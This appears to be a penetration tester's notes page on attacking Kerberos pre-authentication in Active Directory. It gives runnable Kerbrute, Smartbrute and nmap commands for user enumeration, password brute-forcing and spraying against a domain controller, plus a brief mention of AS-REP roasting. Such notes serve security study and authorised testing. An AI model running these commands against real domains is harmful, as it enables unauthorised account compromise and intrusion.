# Pre-authentication Kerberos

## Objectives

* Bruteforce accounts
* Password Spraying
* Bruteforce single user
* Enumerate user

Pre-authentication (AS-REQ) is possible on all accounts that have this checkbox unchecked :\
![](<../.gitbook/assets/image (9).png>)

In Pre-authentication, the user does not supply its password but a secret which is derivated from its password (DES, RC4, AES128 or AES256).

If we know the derivated secret, we don't need to know the password to achieve pre-auth (pass-the-key).

If pre-authentication is disabled, AS-REP Roasting is possible.

## Kerbrute (go)

```
sudo git clone https://github.com/ropnop/kerbrute.git
ls dist/
./kerbrute_linux_amd64 
sudo mv kerbrute_linux_amd64 /usr/local/bin/kerbrute
kerbrute userenum -d corp.com --dc 192.168.152.70 /opt/seclists/Usernames/xato-net-10-million-usernames.txt -o valid_ad_users

```

## Alternative : Smartbrute (Python)

```
# brute mode, users and passwords lists supplied
smartbrute.py brute -bU $USER_LIST -bP $PASSWORD_LIST kerberos -d $DOMAIN

# smart mode, valid credentials supplied for enumeration
smartbrute.py smart -bP $PASSWORD_LIST ntlm -d $DOMAIN -u $USER -p $PASSWORD kerberos// Some code
```

## Nmap

```
nmap -p 88 --script="krb5-enum-users" --script-args="krb5-enum-users.realm='$DOMAIN',userdb=$WORDLIST" $IP_DC

```
